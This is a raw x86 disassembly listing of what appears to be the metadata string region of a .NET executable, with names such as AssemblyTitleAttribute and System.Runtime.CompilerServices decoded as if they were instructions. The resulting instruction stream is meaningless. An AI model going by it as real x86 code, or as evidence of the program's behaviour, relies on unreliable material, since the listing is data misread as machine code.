  402eaf:	addr16 push 0x74744174
  402eb5:	jb     0x402f20
  402eb7:	bound  esi,QWORD PTR [ebp+0x74]
  402eba:	add    BYTE PTR gs:[esi+0x65],cl
  402ebe:	jne    0x402f34
  402ec0:	jb     0x402f23
  402ec2:	ins    BYTE PTR es:[edi],dx
  402ec3:	push   edx
  402ec4:	gs jae 0x402f36
  402ec7:	jne    0x402f3b
  402ec9:	arpl   WORD PTR [ebp+0x73],sp
  402ecc:	dec    esp
  402ecd:	popa   
  402ece:	outs   dx,BYTE PTR ds:[esi]
  402ecf:	addr16 jne 0x402f33
  402ed2:	addr16 gs inc ecx
  402ed5:	je     0x402f4b
  402ed7:	jb     0x402f42
  402ed9:	bound  esi,QWORD PTR [ebp+0x74]
  402edc:	add    BYTE PTR gs:[ecx+0x73],al
  402ee0:	jae    0x402f47
  402ee2:	ins    DWORD PTR es:[edi],dx
  402ee3:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402ee7:	gs ins BYTE PTR es:[edi],dx
  402ee9:	popa   
  402eea:	jns    0x402f3f
  402eec:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  402ef3:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402efa:	jae    0x402f6f
  402efc:	gs ins DWORD PTR es:[edi],dx
  402efe:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  402f02:	gs jns 0x402f4b
  402f05:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  402f0d:	bound  esi,QWORD PTR [ebp+0x74]
  402f10:	add    BYTE PTR gs:[ebx+0x79],dl
  402f14:	jae    0x402f8a
  402f16:	gs ins DWORD PTR es:[edi],dx
  402f18:	cs push edx
  402f1a:	jne    0x402f8a
  402f1c:	je     0x402f87
  402f1e:	ins    DWORD PTR es:[edi],dx
  402f1f:	gs cs inc ebx
  402f22:	outs   dx,DWORD PTR ds:[esi]
  402f23:	ins    DWORD PTR es:[edi],dx
  402f24:	jo     0x402f8f
  402f26:	ins    BYTE PTR es:[edi],dx
  402f27:	gs jb  0x402f7d
  402f2a:	gs jb  0x402fa3
  402f2d:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  402f34:	outs   dx,BYTE PTR ds:[esi]
  402f35:	je     0x402fa0
  402f37:	ins    DWORD PTR es:[edi],dx
  402f38:	gs inc ebx
  402f3a:	outs   dx,DWORD PTR ds:[esi]
  402f3b:	ins    DWORD PTR es:[edi],dx
  402f3c:	jo     0x402f9f
  402f3e:	je     0x402fa9
  402f40:	bound  ebp,QWORD PTR [ecx+0x6c]
  402f43:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  402f4b:	bound  esi,QWORD PTR [ebp+0x74]
  402f4e:	add    BYTE PTR gs:[ecx+0x73],al
  402f52:	jae    0x402fb9
  402f54:	ins    DWORD PTR es:[edi],dx
  402f55:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  402f59:	gs jb  0x402fcf
  402f5c:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402f63:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402f6a:	jae    0x402fdf
  402f6c:	gs ins DWORD PTR es:[edi],dx
  402f6e:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  402f72:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  402f7a:	outs   dx,DWORD PTR ds:[esi]
  402f7b:	outs   dx,BYTE PTR ds:[esi]
  402f7c:	inc    ecx
  402f7d:	je     0x402ff3
  402f7f:	jb     0x402fea
  402f81:	bound  esi,QWORD PTR [ebp+0x74]
  402f84:	add    BYTE PTR gs:[ecx+0x73],al
  402f88:	jae    0x402fef
  402f8a:	ins    DWORD PTR es:[edi],dx
  402f8b:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  402f8f:	outs   dx,BYTE PTR ds:[esi]
  402f90:	outs   dx,WORD PTR ds:[esi]
  402f92:	jb     0x403001
  402f94:	popa   
  402f95:	je     0x403000
  402f97:	outs   dx,DWORD PTR ds:[esi]
  402f98:	outs   dx,BYTE PTR ds:[esi]
  402f99:	popa   
  402f9a:	ins    BYTE PTR es:[edi],dx
  402f9b:	push   esi
  402f9c:	gs jb  0x403012
  402f9f:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402fa6:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  402fad:	popa   
  402fae:	je     0x403015
  402fb0:	ins    BYTE PTR es:[edi],dx
  402fb1:	ins    BYTE PTR es:[edi],dx
  402fb2:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  402fba:	popa   
  402fbb:	arpl   WORD PTR [esi+edx*2+0x65],si
  402fbf:	jb     0x403034
  402fc1:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402fc8:	imul   esp,DWORD PTR [edx+0x75],0x49006574
  402fcf:	outs   dx,BYTE PTR ds:[esi]
  402fd0:	je     0x403037
  402fd2:	jb     0x403042
  402fd4:	popa   
  402fd5:	ins    BYTE PTR es:[edi],dx
  402fd6:	jae    0x40302e
  402fd8:	imul   esi,DWORD PTR [ebx+0x69],0x54656c62
  402fdf:	outs   dx,DWORD PTR ds:[esi]
  402fe0:	inc    ecx
  402fe1:	je     0x403057
  402fe3:	jb     0x40304e
  402fe5:	bound  esi,QWORD PTR [ebp+0x74]
  402fe8:	add    BYTE PTR gs:[ebx+0x79],dl
  402fec:	jae    0x403062
  402fee:	gs ins DWORD PTR es:[edi],dx
  402ff0:	cs push ebx
  402ff2:	arpl   WORD PTR gs:[ebp+0x72],si
  402ff6:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  402ffe:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  403005:	add    BYTE PTR [ebx+0x65],dl
  403008:	arpl   WORD PTR [ebp+0x72],si
  40300b:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  403013:	jae    0x403088
  403015:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40301c:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  403023:	arpl   WORD PTR gs:[ebp+0x72],si
  403027:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x6f697463
  40302f:	outs   dx,BYTE PTR ds:[esi]
  403030:	add    BYTE PTR [ebx+0x79],dl
  403033:	jae    0x4030a9
  403035:	gs ins DWORD PTR es:[edi],dx
  403037:	cs inc esp
  403039:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  403040:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  403047:	jne    0x4030b0
  403049:	addr16 popa 
  40304b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  40304f:	je     0x4030c5
  403051:	jb     0x4030bc
  403053:	bound  esi,QWORD PTR [ebp+0x74]
  403056:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40305b:	jne    0x4030c4
  40305d:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  403065:	jae    0x403067
  403067:	inc    ebx
  403068:	outs   dx,DWORD PTR ds:[esi]
  403069:	ins    DWORD PTR es:[edi],dx
  40306a:	jo     0x4030d5
  40306c:	ins    BYTE PTR es:[edi],dx
  40306d:	popa   
  40306e:	je     0x4030d9
  403070:	outs   dx,DWORD PTR ds:[esi]
  403071:	outs   dx,BYTE PTR ds:[esi]
  403072:	push   edx
  403073:	gs ins BYTE PTR es:[edi],dx
  403075:	popa   
  403076:	js     0x4030d9
  403078:	je     0x4030e3
  40307a:	outs   dx,DWORD PTR ds:[esi]
  40307b:	outs   dx,BYTE PTR ds:[esi]
  40307c:	jae    0x4030bf
  40307e:	je     0x4030f4
  403080:	jb     0x4030eb
  403082:	bound  esi,QWORD PTR [ebp+0x74]
  403085:	add    BYTE PTR gs:[ecx+0x6e],cl
  403089:	je     0x4030f0
  40308b:	ins    BYTE PTR es:[edi],dx
  40308c:	ins    BYTE PTR es:[edi],dx
  40308d:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x4c006563
  403095:	outs   dx,DWORD PTR ds:[esi]
  403096:	popa   
  403097:	fs gs jb 0x4030ea
  40309b:	jo     0x403111
  40309d:	imul   ebp,DWORD PTR [ebp+0x69],0x6974617a
  4030a4:	outs   dx,DWORD PTR ds:[esi]
  4030a5:	outs   dx,BYTE PTR ds:[esi]
  4030a6:	inc    ecx
  4030a7:	je     0x40311d
  4030a9:	jb     0x403114
  4030ab:	bound  esi,QWORD PTR [ebp+0x74]
  4030ae:	add    BYTE PTR gs:[edi+ebp*2+0x61],cl
  4030b3:	fs gs jb 0x403106
  4030b7:	jo     0x40312d
  4030b9:	imul   ebp,DWORD PTR [ebp+0x69],0x6974617a
  4030c0:	outs   dx,DWORD PTR ds:[esi]
  4030c1:	outs   dx,BYTE PTR ds:[esi]
  4030c2:	add    BYTE PTR [esi+edi*1],bh
  4030c5:	arpl   WORD PTR [edi+0x5f],bx
  4030c8:	inc    esp
  4030c9:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  4030d0:	ins    BYTE PTR es:[edi],dx
  4030d1:	popa   
  4030d2:	jae    0x403147
  4030d4:	xor    eax,DWORD PTR [eax]
  4030d6:	cmp    al,0x3e
  4030d8:	arpl   WORD PTR [edi+0x5f],bx
  4030db:	inc    esp
  4030dc:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  4030e3:	ins    BYTE PTR es:[edi],dx
  4030e4:	popa   
  4030e5:	jae    0x40315a
  4030e7:	xor    eax,0x63694d00
  4030ec:	jb     0x40315d
  4030ee:	jae    0x40315f
  4030f0:	data16 je 0x403121
  4030f3:	dec    ecx
  4030f4:	outs   dx,BYTE PTR ds:[esi]
  4030f5:	je     0x40315c
  4030f7:	ins    BYTE PTR es:[edi],dx
  4030f8:	ins    BYTE PTR es:[edi],dx
  4030f9:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x312e6563
  403101:	xor    DWORD PTR [esi],ebp
  403103:	xor    BYTE PTR [esi],ch
  403105:	xor    BYTE PTR [eax],al
  403107:	dec    ebp
  403108:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40310f:	je     0x40313f
  403111:	push   esi
  403112:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403119:	jne    0x40317f
  40311b:	imul   ebp,DWORD PTR [edi+0x2e],0x67616944
  403122:	outs   dx,BYTE PTR ds:[esi]
  403123:	outs   dx,DWORD PTR ds:[esi]
  403124:	jae    0x40319a
  403126:	imul   esp,DWORD PTR [ebx+0x73],0x676f4c2e
  40312d:	imul   ebp,DWORD PTR [bp+0x67],0x754f4900
  403135:	je     0x4031a7
  403137:	jne    0x4031ad
  403139:	je     0x4031a0
  40313b:	jb     0x40313d
  40313d:	outs   dx,DWORD PTR ds:[esi]
  40313e:	jne    0x4031b4
  403140:	jo     0x4031b7
  403142:	je     0x4031b8
  403144:	gs jb  0x403147
  403147:	jb     0x4031ae
  403149:	je     0x4031c0
  40314b:	jb     0x4031bb
  40314d:	push   esi
  40314e:	popa   
  40314f:	ins    BYTE PTR es:[edi],dx
  403150:	jne    0x4031b7
  403152:	add    BYTE PTR [ecx*2+0x3e6e6961],bh
  403159:	bound  ebx,QWORD PTR [edi+0x5f]
  40315c:	xor    BYTE PTR [eax],al
  40315e:	inc    ebx
  40315f:	push   ebx
  403160:	and    al,0x3c
  403162:	cmp    BYTE PTR ds:[edi+0x5f],bl
  403166:	ins    BYTE PTR es:[edi],dx
  403167:	outs   dx,DWORD PTR ds:[esi]
  403168:	arpl   WORD PTR [ecx+0x6c],sp
  40316b:	jae    0x4031a1
  40316d:	add    BYTE PTR [ebp+0x69],cl
  403170:	arpl   WORD PTR [edx+0x6f],si
  403173:	jae    0x4031e4
  403175:	data16 je 0x4031a6
  403178:	push   esi
  403179:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403180:	jne    0x4031e6
  403182:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e49
  403189:	ins    BYTE PTR es:[edi],dx
  40318a:	ins    BYTE PTR es:[edi],dx
  40318b:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x56006563
  403193:	push   ebx
  403194:	push   esp
  403195:	jb     0x4031f8
  403197:	arpl   WORD PTR [ebp+0x4c],sp
  40319a:	outs   dx,DWORD PTR ds:[esi]
  40319b:	add    BYTE PTR [bp+0x73],dh
  40319f:	push   esp
  4031a0:	jb     0x403203
  4031a2:	arpl   WORD PTR [ebp+0x4c],sp
  4031a5:	outs   dx,DWORD PTR ds:[esi]
  4031a6:	add    BYTE PTR [bp+di+0x6f],al
  4031aa:	outs   dx,BYTE PTR ds:[esi]
  4031ab:	jae    0x40321c
  4031ad:	ins    BYTE PTR es:[edi],dx
  4031ae:	gs inc ebx
  4031b0:	popa   
  4031b1:	outs   dx,BYTE PTR ds:[esi]
  4031b2:	arpl   WORD PTR [ebp+0x6c],sp
  4031b5:	inc    ebp
  4031b6:	jbe    0x40321d
  4031b8:	outs   dx,BYTE PTR ds:[esi]
  4031b9:	je     0x4031fc
  4031bb:	jb     0x403224
  4031bd:	jae    0x4031bf
  4031bf:	cmp    al,0x4d
  4031c1:	popa   
  4031c2:	imul   ebp,DWORD PTR [esi+0x3e],0x315f5f62
  4031c9:	add    BYTE PTR [ebx+0x65],dh
  4031cc:	outs   dx,BYTE PTR ds:[esi]
  4031cd:	fs gs jb 0x4031d1
  4031d1:	add    BYTE PTR gs:[edi+0x75],cl
  4031d5:	je     0x403247
  4031d7:	jne    0x40324d
  4031d9:	dec    eax
  4031da:	gs ins BYTE PTR es:[edi],dx
  4031dc:	jo     0x403243
  4031de:	jb     0x4031e0
  4031e0:	inc    ebx
  4031e1:	outs   dx,DWORD PTR ds:[esi]
  4031e2:	outs   dx,BYTE PTR ds:[esi]
  4031e3:	jae    0x403254
  4031e5:	ins    BYTE PTR es:[edi],dx
  4031e6:	gs push ebx
  4031e8:	jo     0x40324f
  4031ea:	arpl   WORD PTR [ecx+0x61],bp
  4031ed:	ins    BYTE PTR es:[edi],dx
  4031ee:	dec    ebx
  4031ef:	gs jns 0x4031f2
  4031f2:	addr16 gs je 0x403255
  4031f6:	push   ebx
  4031f7:	jo     0x40325e
  4031f9:	arpl   WORD PTR [ecx+0x61],bp
  4031fc:	ins    BYTE PTR es:[edi],dx
  4031fd:	dec    ebx
  4031fe:	gs jns 0x403201
  403201:	push   esp
  403202:	jb     0x403265
  403204:	arpl   WORD PTR [ebp+0x4c],sp
  403207:	outs   dx,DWORD PTR ds:[esi]
  403208:	addr16 addr16 gs jb 0x40320d
  40320d:	addr16 gs je 0x403270
  403211:	dec    esp
  403212:	outs   dx,DWORD PTR ds:[esi]
  403213:	addr16 addr16 gs jb 0x403218
  403218:	dec    ebp
  403219:	gs jae 0x40328f
  40321c:	popa   
  40321d:	add    BYTE PTR gs:[si+0x6f],cl
  403222:	addr16 addr16 gs jb 0x40326c
  403227:	outs   dx,BYTE PTR ds:[esi]
  403228:	imul   ebp,DWORD PTR [bp+0x65],0x6f745300
  403230:	jo     0x403232
  403232:	jae    0x403299
  403234:	je     0x403295
  403236:	inc    ebx
  403237:	popa   
  403238:	outs   dx,BYTE PTR ds:[esi]
  403239:	arpl   WORD PTR [ebp+0x6c],sp
  40323c:	add    BYTE PTR [edx+0x65],dl
  40323f:	jno    0x4032b6
  403241:	gs jae 0x4032b8
  403244:	inc    ebx
  403245:	popa   
  403246:	outs   dx,BYTE PTR ds:[esi]
  403247:	arpl   WORD PTR [ebp+0x6c],sp
  40324a:	add    BYTE PTR [edi+0x65],ah
  40324d:	je     0x4032ae
  40324f:	dec    ecx
  403250:	outs   dx,BYTE PTR ds:[esi]
  403251:	jae    0x4032c7
  403253:	popa   
  403254:	ins    BYTE PTR es:[edi],dx
  403255:	ins    BYTE PTR es:[edi],dx
  403256:	inc    esp
  403257:	imul   esi,DWORD PTR [edx+0x0],0x67676f4c
  40325e:	gs jb  0x4032b1
  403261:	jb     0x4032d2
  403263:	arpl   WORD PTR [ebp+0x73],sp
  403266:	jae    0x4032b6
  403268:	popa   
  403269:	ins    DWORD PTR es:[edi],dx
  40326a:	add    BYTE PTR gs:[ebx+0x79],dl
  40326e:	jae    0x4032e4
  403270:	gs ins DWORD PTR es:[edi],dx
  403272:	cs dec ecx
  403274:	dec    edi
  403275:	add    BYTE PTR [eax+0x61],dl
  403278:	je     0x4032e2
  40327a:	add    BYTE PTR [ebx+0x6f],al
  40327d:	ins    DWORD PTR es:[edi],dx
  40327e:	bound  ebp,QWORD PTR [ecx+0x6e]
  403281:	add    BYTE PTR gs:[ebx+0x6f],al
  403285:	outs   dx,BYTE PTR ds:[esi]
  403286:	jae    0x4032f7
  403288:	ins    BYTE PTR es:[edi],dx
  403289:	gs inc ebx
  40328b:	popa   
  40328c:	outs   dx,BYTE PTR ds:[esi]
  40328d:	arpl   WORD PTR [ebp+0x6c],sp
  403290:	inc    ebp
  403291:	jbe    0x4032f8
  403293:	outs   dx,BYTE PTR ds:[esi]
  403294:	je     0x4032de
  403296:	popa   
  403297:	outs   dx,BYTE PTR ds:[esi]
  403298:	fs ins BYTE PTR es:[edi],dx
  40329a:	gs jb  0x40329d
  40329d:	inc    ebx
  40329e:	outs   dx,DWORD PTR ds:[esi]
  40329f:	outs   dx,BYTE PTR ds:[esi]
  4032a0:	jae    0x403311
  4032a2:	ins    BYTE PTR es:[edi],dx
  4032a3:	add    BYTE PTR gs:[ecx+0x64],ah
  4032a7:	fs pop edi
  4032a9:	inc    ebx
  4032aa:	popa   
  4032ab:	outs   dx,BYTE PTR ds:[esi]
  4032ac:	arpl   WORD PTR [ebp+0x6c],sp
  4032af:	dec    ebx
  4032b0:	gs jns 0x403303
  4032b3:	jb     0x40331a
  4032b5:	jae    0x40332a
  4032b7:	add    BYTE PTR [ecx+0x50],cl
  4032ba:	jb     0x40332b
  4032bc:	arpl   WORD PTR [ebp+0x73],sp
  4032bf:	jae    0x403304
  4032c1:	outs   dx,DWORD PTR ds:[esi]
  4032c2:	ins    DWORD PTR es:[edi],dx
  4032c3:	ins    DWORD PTR es:[edi],dx
  4032c4:	popa   
  4032c5:	outs   dx,BYTE PTR ds:[esi]
  4032c6:	fs dec esp
  4032c8:	imul   ebp,DWORD PTR [esi+0x65],0x6f725000
  4032cf:	arpl   WORD PTR [ebp+0x73],sp
  4032d2:	jae    0x403317
  4032d4:	outs   dx,DWORD PTR ds:[esi]
  4032d5:	ins    DWORD PTR es:[edi],dx
  4032d6:	ins    DWORD PTR es:[edi],dx
  4032d7:	popa   
  4032d8:	outs   dx,BYTE PTR ds:[esi]
  4032d9:	fs dec esp
  4032db:	imul   ebp,DWORD PTR [esi+0x65],0x65784500
  4032e2:	arpl   WORD PTR [ebp+0x74],si
  4032e5:	add    BYTE PTR gs:[ebp+0x6e],al
  4032e9:	jbe    0x403354
  4032eb:	jb     0x40335c
  4032ed:	outs   dx,BYTE PTR ds:[esi]
  4032ee:	ins    DWORD PTR es:[edi],dx
  4032ef:	outs   dx,BYTE PTR gs:[esi]
  4032f1:	je     0x4032f3
  4032f3:	inc    edi
  4032f4:	gs je  0x40333c
  4032f7:	outs   dx,BYTE PTR ds:[esi]
  4032f8:	jbe    0x403363
  4032fa:	jb     0x40336b
  4032fc:	outs   dx,BYTE PTR ds:[esi]
  4032fd:	ins    DWORD PTR es:[edi],dx
  4032fe:	outs   dx,BYTE PTR gs:[esi]
  403300:	je     0x403358
  403302:	popa   
  403303:	jb     0x40336e
  403305:	popa   
  403306:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  40330a:	push   ebx
  40330b:	je     0x40337f
  40330d:	imul   ebp,DWORD PTR [esi+0x67],0x4e734900
  403314:	jne    0x403382
  403316:	ins    BYTE PTR es:[edi],dx
  403317:	dec    edi
  403318:	jb     0x40335f
  40331a:	ins    DWORD PTR es:[edi],dx
  40331b:	jo     0x403391
  40331d:	jns    0x40331f
  40331f:	push   edx
  403320:	gs ins DWORD PTR es:[edi],dx
  403322:	outs   dx,DWORD PTR ds:[esi]
  403323:	je     0x40338a
  403325:	dec    edi
  403326:	jne    0x40339c
  403328:	jo     0x40339f
  40332a:	je     0x4033a0
  40332c:	gs jb  0x40332f
  40332f:	inc    ebx
  403330:	outs   dx,DWORD PTR ds:[esi]
  403331:	outs   dx,BYTE PTR ds:[esi]
  403332:	jae    0x4033a3
  403334:	ins    BYTE PTR es:[edi],dx
  403335:	gs dec edi
  403337:	jne    0x4033ad
  403339:	jo     0x4033b0
  40333b:	je     0x4033b1
  40333d:	gs jb  0x403340
  403340:	inc    ebx
  403341:	push   0x656e6961
  403346:	fs dec edi
  403348:	jne    0x4033be
  40334a:	jo     0x4033c1
  40334c:	je     0x4033c2
  40334e:	gs jb  0x403351
  403351:	push   ebx
  403352:	jns    0x4033c7
  403354:	je     0x4033bb
  403356:	ins    DWORD PTR es:[edi],dx
  403357:	cs inc ebx
  403359:	outs   dx,DWORD PTR ds:[esi]
  40335a:	ins    BYTE PTR es:[edi],dx
  40335b:	ins    BYTE PTR es:[edi],dx
  40335c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403361:	outs   dx,BYTE PTR ds:[esi]
  403362:	jae    0x403392
  403364:	inc    edi
  403365:	outs   dx,BYTE PTR gs:[esi]
  403367:	gs jb  0x4033d3
  40336a:	arpl   WORD PTR [eax],ax
  40336c:	dec    ecx
  40336d:	dec    esp
  40336e:	imul   esi,DWORD PTR [ebx+0x74],0x4d003160
  403375:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40337c:	je     0x4033ac
  40337e:	push   esi
  40337f:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403386:	jne    0x4033ec
  403388:	imul   ebp,DWORD PTR [edi+0x2e],0x67616944
  40338f:	outs   dx,BYTE PTR ds:[esi]
  403390:	outs   dx,DWORD PTR ds:[esi]
  403391:	jae    0x403407
  403393:	imul   esp,DWORD PTR [ebx+0x73],0x6d6f432e
  40339a:	ins    DWORD PTR es:[edi],dx
  40339b:	outs   dx,DWORD PTR ds:[esi]
  40339c:	outs   dx,BYTE PTR ds:[esi]
  40339d:	add    BYTE PTR [ecx+0x4c],cl
  4033a0:	inc    ebp
  4033a1:	js     0x403406
  4033a3:	gs jo  0x40341a
  4033a6:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  4033ad:	gs jb  0x4033b0
  4033b0:	dec    ecx
  4033b1:	outs   dx,BYTE PTR ds:[esi]
  4033b2:	jbe    0x403423
  4033b4:	arpl   WORD PTR [ecx+0x74],sp
  4033b7:	imul   ebp,DWORD PTR [edi+0x6e],0x67726154
  4033be:	gs je  0x4033c1
  4033c1:	inc    ebp
  4033c2:	js     0x403427
  4033c4:	gs jo  0x40343b
  4033c7:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  4033ce:	gs jb  0x4033d1
  4033d1:	dec    ecx
  4033d2:	outs   dx,BYTE PTR ds:[esi]
  4033d3:	jbe    0x403444
  4033d5:	imul   esp,DWORD PTR [ebp+0x0],0x4c
  4033d9:	outs   dx,DWORD PTR ds:[esi]
  4033da:	addr16 addr16 gs jb 0x403433
  4033df:	popa   
  4033e0:	jae    0x40344d
  4033e2:	push   edx
  4033e3:	gs jae 0x403455
  4033e6:	jne    0x40345a
  4033e8:	arpl   WORD PTR [ebp+0x73],sp
  4033eb:	add    BYTE PTR [edi+0x65],ah
  4033ee:	je     0x40344f
  4033f0:	inc    ebp
  4033f1:	jb     0x403465
  4033f3:	pop    edi
  4033f4:	dec    ecx
  4033f5:	outs   dx,BYTE PTR ds:[esi]
  4033f6:	je     0x40345d
  4033f8:	jb     0x403468
  4033fa:	popa   
  4033fb:	ins    BYTE PTR es:[edi],dx
  4033fc:	inc    ebp
  4033fd:	jb     0x403471
  4033ff:	outs   dx,DWORD PTR ds:[esi]
  403400:	jb     0x403402
  403402:	inc    ebp
  403403:	jb     0x403477
  403405:	outs   dx,DWORD PTR ds:[esi]
  403406:	jb     0x403408
  403408:	inc    ebp
  403409:	js     0x40346e
  40340b:	gs jo  0x403482
  40340e:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f4300
  403415:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x416c616e
  40341e:	je     0x403494
  403420:	jb     0x40348b
  403422:	bound  esi,QWORD PTR [ebp+0x74]
  403425:	add    BYTE PTR gs:[ebx+0x68],al
  403429:	popa   
  40342a:	jb     0x40342c
  40342c:	push   ebx
  40342d:	jo     0x40349b
  40342f:	imul   esi,DWORD PTR [eax+eax*1+0x53],0x6e697274
  403437:	addr16 inc ebx
  403439:	outs   dx,DWORD PTR ds:[esi]
  40343a:	ins    DWORD PTR es:[edi],dx
  40343b:	jo     0x40349e
  40343d:	jb     0x4034a8
  40343f:	jae    0x4034b0
  403441:	outs   dx,BYTE PTR ds:[esi]
  403442:	add    BYTE PTR [ebx+0x6f],al
  403445:	ins    DWORD PTR es:[edi],dx
  403446:	jo     0x4034a9
  403448:	jb     0x4034af
  40344a:	add    BYTE PTR [ebx+0x6f],al
  40344d:	ins    DWORD PTR es:[edi],dx
  40344e:	jo     0x4034b9
  403450:	ins    BYTE PTR es:[edi],dx
  403451:	gs jb  0x40349b
  403454:	outs   dx,BYTE PTR gs:[esi]
  403456:	gs jb  0x4034ba
  403459:	je     0x4034c0
  40345b:	fs inc ecx
  40345d:	je     0x4034d3
  40345f:	jb     0x4034ca
  403461:	bound  esi,QWORD PTR [ebp+0x74]
  403464:	add    BYTE PTR gs:[ebx+0x79],dl
  403468:	jae    0x4034de
  40346a:	gs ins DWORD PTR es:[edi],dx
  40346c:	cs inc ebx
  40346e:	outs   dx,DWORD PTR ds:[esi]
  40346f:	fs gs inc esp
  403472:	outs   dx,DWORD PTR ds:[esi]
  403473:	ins    DWORD PTR es:[edi],dx
  403474:	cs inc ebx
  403476:	outs   dx,DWORD PTR ds:[esi]
  403477:	ins    DWORD PTR es:[edi],dx
  403478:	jo     0x4034e3
  40347a:	ins    BYTE PTR es:[edi],dx
  40347b:	gs jb  0x40347e
  40347e:	inc    edi
  40347f:	outs   dx,BYTE PTR gs:[esi]
  403481:	gs jb  0x4034e5
  403484:	je     0x4034eb
  403486:	fs inc ebx
  403488:	outs   dx,DWORD PTR ds:[esi]
  403489:	fs gs inc ecx
  40348c:	je     0x403502
  40348e:	jb     0x4034f9
  403490:	bound  esi,QWORD PTR [ebp+0x74]
  403493:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  403498:	jne    0x403501
  40349a:	addr16 gs jb 0x4034ec
  40349e:	outs   dx,DWORD PTR ds:[esi]
  40349f:	outs   dx,BYTE PTR ds:[esi]
  4034a0:	push   ebp
  4034a1:	jae    0x403508
  4034a3:	jb     0x4034e8
  4034a5:	outs   dx,DWORD PTR ds:[esi]
  4034a6:	fs gs inc ecx
  4034a9:	je     0x40351f
  4034ab:	jb     0x403516
  4034ad:	bound  esi,QWORD PTR [ebp+0x74]
  4034b0:	add    BYTE PTR gs:[edx+0x65],dl
  4034b4:	data16 gs jb 0x40351d
  4034b8:	outs   dx,BYTE PTR ds:[esi]
  4034b9:	arpl   WORD PTR [ebp+0x45],sp
  4034bc:	jno    0x403533
  4034be:	popa   
  4034bf:	ins    BYTE PTR es:[edi],dx
  4034c0:	jae    0x4034c2
  4034c2:	push   esp
  4034c3:	jns    0x403535
  4034c5:	add    BYTE PTR gs:[edx+0x75],dl
  4034c9:	outs   dx,BYTE PTR ds:[esi]
  4034ca:	je     0x403535
  4034cc:	ins    DWORD PTR es:[edi],dx
  4034cd:	gs push esp
  4034cf:	jns    0x403541
  4034d1:	gs dec eax
  4034d3:	popa   
  4034d4:	outs   dx,BYTE PTR ds:[esi]
  4034d5:	fs ins BYTE PTR es:[edi],dx
  4034d7:	add    BYTE PTR gs:[edi+0x65],al
  4034db:	je     0x403531
  4034dd:	jns    0x40354f
  4034df:	gs inc esi
  4034e1:	jb     0x403552
  4034e3:	ins    DWORD PTR es:[edi],dx
  4034e4:	dec    eax
  4034e5:	popa   
  4034e6:	outs   dx,BYTE PTR ds:[esi]
  4034e7:	fs ins BYTE PTR es:[edi],dx
  4034e9:	add    BYTE PTR gs:[ecx+0x73],al
  4034ed:	jae    0x403554
  4034ef:	ins    DWORD PTR es:[edi],dx
  4034f0:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4034f4:	addr16 gs je 0x403557
  4034f8:	inc    ecx
  4034f9:	jae    0x40356e
  4034fb:	gs ins DWORD PTR es:[edi],dx
  4034fd:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  403501:	inc    edi
  403502:	gs je  0x403558
  403505:	je     0x403579
  403507:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  40350e:	je     0x403575
  403510:	ins    DWORD PTR es:[edi],dx
  403511:	cs inc ebx
  403513:	outs   dx,DWORD PTR ds:[esi]
  403514:	ins    DWORD PTR es:[edi],dx
  403515:	jo     0x403586
  403517:	outs   dx,BYTE PTR ds:[esi]
  403518:	outs   dx,BYTE PTR gs:[esi]
  40351a:	je     0x403569
  40351c:	outs   dx,DWORD PTR ds:[esi]
  40351d:	fs gs ins BYTE PTR es:[edi],dx
  403520:	add    BYTE PTR [ebp+0x64],al
  403523:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  40352b:	jae    0x40358e
  40352d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  403531:	je     0x4035a7
  403533:	jb     0x40359e
  403535:	bound  esi,QWORD PTR [ebp+0x74]
  403538:	add    BYTE PTR gs:[ebp+0x64],al
  40353c:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  403544:	jae    0x4035a7
  403546:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
